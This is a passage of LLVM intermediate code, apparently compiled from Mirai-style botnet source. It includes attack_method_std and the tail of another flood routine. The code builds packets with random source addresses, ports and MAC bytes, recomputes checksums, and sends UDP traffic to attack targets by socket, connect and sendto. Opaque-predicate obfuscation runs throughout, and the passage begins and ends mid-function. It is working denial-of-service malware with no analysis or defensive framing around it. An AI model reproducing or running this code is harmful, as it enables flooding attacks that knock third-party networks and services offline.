  %423 = and i32 %422, 65535
  %424 = trunc i32 %423 to i16
  %425 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %426 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %425, i32 0, i32 3
  store i16 %424, i16* %426, align 4
  %427 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i32 0, i32 3
  %429 = load i16, i16* %428, align 4
  %430 = zext i16 %429 to i32
  %431 = sub nsw i32 %430, 1000
  %432 = xor i32 %431, -1
  %433 = trunc i32 %432 to i16
  %434 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %435 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %434, i32 0, i32 3
  store i16 %433, i16* %435, align 4
  br label %436

; <label>:436:                                    ; preds = %421, %originalBBpart223
  %437 = load i32, i32* @x.21
  %438 = load i32, i32* @y.22
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %436
  %445 = load i16, i16* %16, align 2
  %446 = zext i16 %445 to i32
  %447 = icmp eq i32 %446, 65535
  %448 = load i32, i32* @x.21
  %449 = load i32, i32* @y.22
  %450 = sub i32 %448, 1
  %451 = mul i32 %448, %450
  %452 = urem i32 %451, 2
  %453 = icmp eq i32 %452, 0
  %454 = icmp slt i32 %449, 10
  %455 = or i1 %453, %454
  br i1 %455, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br i1 %447, label %456, label %462

; <label>:456:                                    ; preds = %originalBBpart227
  %457 = call i32 @rand_next()
  %458 = and i32 %457, 65535
  %459 = trunc i32 %458 to i16
  %460 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %461 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %460, i32 0, i32 0
  store i16 %459, i16* %461, align 2
  br label %462

; <label>:462:                                    ; preds = %456, %originalBBpart227
  %463 = load i16, i16* %17, align 2
  %464 = zext i16 %463 to i32
  %465 = icmp eq i32 %464, 65535
  br i1 %465, label %466, label %472

; <label>:466:                                    ; preds = %462
  %467 = call i32 @rand_next()
  %468 = and i32 %467, 65535
  %469 = trunc i32 %468 to i16
  %470 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %471 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %470, i32 0, i32 1
  store i16 %469, i16* %471, align 2
  br label %472

; <label>:472:                                    ; preds = %466, %462
  %473 = load i8, i8* %20, align 1
  %474 = icmp ne i8 %473, 0
  br i1 %474, label %479, label %475

; <label>:475:                                    ; preds = %472
  %476 = call i32 @rand_next()
  %477 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %478 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %477, i32 0, i32 9
  store i32 %476, i32* %478, align 4
  br label %485

; <label>:479:                                    ; preds = %472
  %480 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %481 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %480, i32 0, i32 9
  %482 = load i32, i32* %481, align 4
  %483 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %484 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %483, i32 0, i32 9
  store i32 %482, i32* %484, align 4
  br label %485

; <label>:485:                                    ; preds = %479, %475
  %486 = load i32, i32* @x.21
  %487 = load i32, i32* @y.22
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %485
  %494 = call i32 @rand_next()
  store i32 %494, i32* %37, align 4
  %495 = call i32 @rand_next()
  store i32 %495, i32* %38, align 4
  %496 = call i32 @rand_next()
  store i32 %496, i32* %39, align 4
  %497 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %498 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %497, i32 0, i32 0
  %499 = getelementptr inbounds [6 x i8], [6 x i8]* %498, i32 0, i32 0
  %500 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %499, i8* %500, i32 4)
  %501 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %502 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %501, i32 0, i32 1
  %503 = getelementptr inbounds [6 x i8], [6 x i8]* %502, i32 0, i32 0
  %504 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %503, i8* %504, i32 4)
  %505 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %506 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %505, i32 0, i32 0
  %507 = getelementptr inbounds [6 x i8], [6 x i8]* %506, i32 0, i32 0
  %508 = getelementptr inbounds i8, i8* %507, i64 4
  %509 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %508, i8* %509, i32 2)
  %510 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %511 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %510, i32 0, i32 1
  %512 = getelementptr inbounds [6 x i8], [6 x i8]* %511, i32 0, i32 0
  %513 = getelementptr inbounds i8, i8* %512, i64 4
  %514 = bitcast i32* %39 to i8*
  %515 = getelementptr inbounds i8, i8* %514, i64 2
  call void @util_memcpy(i8* %513, i8* %515, i32 2)
  %516 = load i8, i8* %19, align 1
  %517 = icmp ne i8 %516, 0
  %518 = load i32, i32* @x.21
  %519 = load i32, i32* @y.22
  %520 = sub i32 %518, 1
  %521 = mul i32 %518, %520
  %522 = urem i32 %521, 2
  %523 = icmp eq i32 %522, 0
  %524 = icmp slt i32 %519, 10
  %525 = or i1 %523, %524
  br i1 %525, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %517, label %526, label %529

; <label>:526:                                    ; preds = %originalBBpart231
  %527 = load i8*, i8** %36, align 8
  %528 = load i32, i32* %18, align 4
  call void @rand_str(i8* %527, i32 %528)
  br label %529

; <label>:529:                                    ; preds = %526, %originalBBpart231
  %530 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %531 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %530, i32 0, i32 7
  store i16 0, i16* %531, align 2
  %532 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %533 = bitcast %struct.iphdr* %532 to i16*
  %534 = call zeroext i16 @checksum_generic(i16* %533, i32 20)
  %535 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %536 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %535, i32 0, i32 7
  store i16 %534, i16* %536, align 2
  %537 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %538 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %537, i32 0, i32 7
  store i16 0, i16* %538, align 2
  %539 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %540 = bitcast %struct.iphdr* %539 to i16*
  %541 = call zeroext i16 @checksum_generic(i16* %540, i32 20)
  %542 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %543 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %542, i32 0, i32 7
  store i16 %541, i16* %543, align 2
  %544 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %545 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %544, i32 0, i32 3
  store i16 0, i16* %545, align 2
  %546 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %547 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %548 = bitcast %struct.udphdr* %547 to i8*
  %549 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %550 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %549, i32 0, i32 2
  %551 = load i16, i16* %550, align 2
  %552 = load i32, i32* %18, align 4
  %553 = sext i32 %552 to i64
  %554 = add i64 8, %553
  %555 = trunc i64 %554 to i32
  %556 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %546, i8* %548, i16 zeroext %551, i32 %555)
  %557 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %558 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %557, i32 0, i32 3
  store i16 %556, i16* %558, align 2
  %559 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %560 = load i32, i32* %9, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %559, i64 %561
  %563 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %562, i32 0, i32 0
  %564 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %563, i32 0, i32 0
  store i16 2, i16* %564, align 4
  %565 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %566 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %565, i32 0, i32 9
  %567 = load i32, i32* %566, align 4
  %568 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %569 = load i32, i32* %9, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %568, i64 %570
  %572 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %571, i32 0, i32 0
  %573 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %572, i32 0, i32 2
  %574 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %573, i32 0, i32 0
  store i32 %567, i32* %574, align 4
  %575 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %576 = load i32, i32* %9, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %575, i64 %577
  %579 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %578, i32 0, i32 0
  %580 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %579, i32 0, i32 1
  store i16 0, i16* %580, align 2
  %581 = load i32, i32* %10, align 4
  %582 = load i8*, i8** %30, align 8
  %583 = load i32, i32* %18, align 4
  %584 = sext i32 %583 to i64
  %585 = add i64 66, %584
  %586 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %587 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %588 = load i32, i32* %9, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i64 %589
  %591 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %590, i32 0, i32 0
  %592 = bitcast %struct.sockaddr_in* %591 to %struct.sockaddr*
  store %struct.sockaddr* %592, %struct.sockaddr** %586, align 8
  %593 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %594 = load %struct.sockaddr*, %struct.sockaddr** %593, align 8
  %595 = call i64 @sendto(i32 %581, i8* %582, i64 %585, i32 16384, %struct.sockaddr* %594, i32 16)
  br label %596

; <label>:596:                                    ; preds = %529
  %597 = load i32, i32* %9, align 4
  %598 = add nsw i32 %597, 1
  store i32 %598, i32* %9, align 4
  br label %321

; <label>:599:                                    ; preds = %321
  %600 = load i32, i32* @x.21
  %601 = load i32, i32* @y.22
  %602 = sub i32 %600, 1
  %603 = mul i32 %600, %602
  %604 = urem i32 %603, 2
  %605 = icmp eq i32 %604, 0
  %606 = icmp slt i32 %601, 10
  %607 = or i1 %605, %606
  br i1 %607, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %599
  %608 = load i32, i32* @x.21
  %609 = load i32, i32* @y.22
  %610 = sub i32 %608, 1
  %611 = mul i32 %608, %610
  %612 = urem i32 %611, 2
  %613 = icmp eq i32 %612, 0
  %614 = icmp slt i32 %609, 10
  %615 = or i1 %613, %614
  br i1 %615, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %304

; <label>:616:                                    ; preds = %108, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %86
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %238
  %617 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %618 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %617, i32 0, i32 9
  %619 = load i32, i32* %618, align 4
  %620 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %621 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %620, i32 0, i32 9
  store i32 %619, i32* %621, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %284
  %622 = load i32, i32* %9, align 4
  %_ = shl i32 %622, 1
  %_7 = shl i32 %622, 1
  %_8 = shl i32 %622, 1
  %_9 = sub i32 %622, 1
  %gen = mul i32 %_9, 1
  %623 = add nsw i32 %622, 1
  store i32 %623, i32* %9, align 4
  br label %originalBB6

originalBB13alteredBB:                            ; preds = %originalBB13, %304
  store i32 0, i32* %9, align 4
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %381
  %624 = call i32 @rand_next()
  %625 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %626 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %625, i32 0, i32 8
  store i32 %624, i32* %626, align 4
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %401
  %627 = load i16, i16* %13, align 2
  %628 = zext i16 %627 to i32
  %629 = icmp eq i32 %628, 65535
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %436
  %630 = load i16, i16* %16, align 2
  %631 = zext i16 %630 to i32
  %632 = icmp eq i32 %631, 65535
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %485
  %633 = call i32 @rand_next()
  store i32 %633, i32* %37, align 4
  %634 = call i32 @rand_next()
  store i32 %634, i32* %38, align 4
  %635 = call i32 @rand_next()
  store i32 %635, i32* %39, align 4
  %636 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %637 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %636, i32 0, i32 0
  %638 = getelementptr inbounds [6 x i8], [6 x i8]* %637, i32 0, i32 0
  %639 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %638, i8* %639, i32 4)
  %640 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %641 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %640, i32 0, i32 1
  %642 = getelementptr inbounds [6 x i8], [6 x i8]* %641, i32 0, i32 0
  %643 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %642, i8* %643, i32 4)
  %644 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %645 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %644, i32 0, i32 0
  %646 = getelementptr inbounds [6 x i8], [6 x i8]* %645, i32 0, i32 0
  %647 = getelementptr inbounds i8, i8* %646, i64 4
  %648 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %647, i8* %648, i32 2)
  %649 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %650 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %649, i32 0, i32 1
  %651 = getelementptr inbounds [6 x i8], [6 x i8]* %650, i32 0, i32 0
  %652 = getelementptr inbounds i8, i8* %651, i64 4
  %653 = bitcast i32* %39 to i8*
  %654 = getelementptr inbounds i8, i8* %653, i64 2
  call void @util_memcpy(i8* %652, i8* %654, i32 2)
  %655 = load i8, i8* %19, align 1
  %656 = icmp ne i8 %655, 0
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %599
  br label %originalBB33
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %234, %57
  %59 = load i32, i32* @x.23
  %60 = load i32, i32* @y.24
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %58
  %67 = load i32, i32* %9, align 4
  %68 = load i8, i8* %5, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp slt i32 %67, %69
  %71 = load i32, i32* @x.23
  %72 = load i32, i32* @y.24
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %70, label %79, label %237

; <label>:79:                                     ; preds = %originalBBpart2
  %80 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %81 = load i8**, i8*** %10, align 8
  %82 = load i32, i32* %9, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8*, i8** %81, i64 %83
  store i8* %80, i8** %84, align 8
  %85 = load i16, i16* %12, align 2
  %86 = zext i16 %85 to i32
  %87 = icmp eq i32 %86, 65535
  br i1 %87, label %88, label %97

; <label>:88:                                     ; preds = %79
  %89 = call i32 @rand_next()
  %90 = trunc i32 %89 to i16
  %91 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %92 = load i32, i32* %9, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %91, i64 %93
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i32 0, i32 0
  %96 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %95, i32 0, i32 1
  store i16 %90, i16* %96, align 2
  br label %106

; <label>:97:                                     ; preds = %79
  %98 = load i16, i16* %12, align 2
  %99 = call zeroext i16 @htons(i16 zeroext %98) #7
  %100 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %101 = load i32, i32* %9, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %100, i64 %102
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %103, i32 0, i32 0
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %104, i32 0, i32 1
  store i16 %99, i16* %105, align 2
  br label %106

; <label>:106:                                    ; preds = %97, %88
  %107 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %108 = load i32*, i32** %11, align 8
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  store i32 %107, i32* %111, align 4
  %112 = icmp eq i32 %107, -1
  br i1 %112, label %113, label %130

; <label>:113:                                    ; preds = %106
  %114 = load i32, i32* @x.23
  %115 = load i32, i32* @y.24
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %113
  %122 = load i32, i32* @x.23
  %123 = load i32, i32* @y.24
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

; <label>:130:                                    ; preds = %106
  %131 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %131, align 4
  %132 = load i16, i16* %13, align 2
  %133 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %132, i16* %133, align 2
  %134 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %135 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %134, i32 0, i32 0
  store i32 0, i32* %135, align 4
  %136 = load i32*, i32** %11, align 8
  %137 = load i32, i32* %9, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i32, i32* %136, i64 %138
  %140 = load i32, i32* %139, align 4
  %141 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %142 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %142, %struct.sockaddr** %141, align 8
  %143 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %144 = load %struct.sockaddr*, %struct.sockaddr** %143, align 8
  %145 = call i32 @bind(i32 %140, %struct.sockaddr* %144, i32 16) #6
  %146 = icmp eq i32 %145, -1
  br i1 %146, label %147, label %148

; <label>:147:                                    ; preds = %130
  br label %148

; <label>:148:                                    ; preds = %147, %130
  %149 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 2
  %154 = load i8, i8* %153, align 4
  %155 = zext i8 %154 to i32
  %156 = icmp slt i32 %155, 32
  br i1 %156, label %157, label %199

; <label>:157:                                    ; preds = %148
  %158 = load i32, i32* @x.23
  %159 = load i32, i32* @y.24
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %157
  %166 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %167 = load i32, i32* %9, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 1
  %171 = load i32, i32* %170, align 4
  %172 = call i32 @ntohl(i32 %171) #7
  %173 = call i32 @rand_next()
  %174 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %175 = load i32, i32* %9, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i64 %176
  %178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %177, i32 0, i32 2
  %179 = load i8, i8* %178, align 4
  %180 = zext i8 %179 to i32
  %181 = lshr i32 %173, %180
  %182 = add i32 %172, %181
  %183 = call i32 @htonl(i32 %182) #7
  %184 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i32 0, i32 0
  %189 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %188, i32 0, i32 2
  %190 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %189, i32 0, i32 0
  store i32 %183, i32* %190, align 4
  %191 = load i32, i32* @x.23
  %192 = load i32, i32* @y.24
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart221, label %originalBB6alteredBB

originalBBpart221:                                ; preds = %originalBB6
  br label %199

; <label>:199:                                    ; preds = %originalBBpart221, %148
  %200 = load i32, i32* @x.23
  %201 = load i32, i32* @y.24
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %199
  %208 = load i32*, i32** %11, align 8
  %209 = load i32, i32* %9, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds i32, i32* %208, i64 %210
  %212 = load i32, i32* %211, align 4
  %213 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %214 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %215 = load i32, i32* %9, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %217, i32 0, i32 0
  %219 = bitcast %struct.sockaddr_in* %218 to %struct.sockaddr*
  store %struct.sockaddr* %219, %struct.sockaddr** %213, align 8
  %220 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %221 = load %struct.sockaddr*, %struct.sockaddr** %220, align 8
  %222 = call i32 @connect(i32 %212, %struct.sockaddr* %221, i32 16)
  %223 = icmp eq i32 %222, -1
  %224 = load i32, i32* @x.23
  %225 = load i32, i32* @y.24
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br i1 %223, label %232, label %233

; <label>:232:                                    ; preds = %originalBBpart225
  br label %233

; <label>:233:                                    ; preds = %232, %originalBBpart225
  br label %234

; <label>:234:                                    ; preds = %233
  %235 = load i32, i32* %9, align 4
  %236 = add nsw i32 %235, 1
  store i32 %236, i32* %9, align 4
  br label %58

; <label>:237:                                    ; preds = %originalBBpart2
  br label %238

; <label>:238:                                    ; preds = %317, %237
  %239 = load i32, i32* @x.23
  %240 = load i32, i32* @y.24
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %238
  store i32 0, i32* %9, align 4
  %247 = load i32, i32* @x.23
  %248 = load i32, i32* @y.24
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
